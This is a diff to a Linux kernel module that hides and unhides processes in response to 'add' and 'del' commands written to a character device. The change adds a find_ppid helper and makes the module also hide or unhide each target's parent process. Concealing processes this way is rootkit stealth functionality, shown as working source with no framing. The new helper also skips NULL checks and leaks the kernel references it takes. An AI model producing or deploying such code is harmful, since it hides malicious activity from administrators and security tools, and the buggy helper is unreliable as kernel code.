@@ -133,6 +133,15 @@ static int unhide_process(pid_t pid)
     return SUCCESS;
 }
 
+static long find_ppid(long pid)
+{
+    struct pid *c_pid = find_get_pid(pid);
+    struct task_struct *c_task = get_pid_task(c_pid, PIDTYPE_PID);
+    struct task_struct *p_task = c_task->real_parent; 
+    
+    return p_task->pid;
+}
+
 #define OUTPUT_BUFFER_FORMAT "pid: %d\n"
 #define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)
 
@@ -170,11 +179,11 @@ static ssize_t device_write(struct file *filep,
                             size_t len,
                             loff_t *offset)
 {
-    long pid;
     int i = 0, count = -1;
     char *message, *tmp;
     char *token;
     long *pid_arr;
+    long pid, ppid;
     char add_message[] = "add", del_message[] = "del";
     if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
         return -EAGAIN;
@@ -198,7 +207,9 @@ static ssize_t device_write(struct file *filep,
         }
         for (i = 0; i < count; ++i) {
             pid = *(pid_arr + i);
+            ppid = find_ppid(pid);
             hide_process(pid);
+            hide_process(ppid);
         }
     } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
         message += sizeof(del_message);
@@ -209,7 +220,9 @@ static ssize_t device_write(struct file *filep,
         }
         for (i = 0; i < count; ++i) {
             pid = *(pid_arr + i);
+            ppid = find_ppid(pid);
             unhide_process(pid);
+            unhide_process(ppid);
         }
     } else {
         kfree(message);
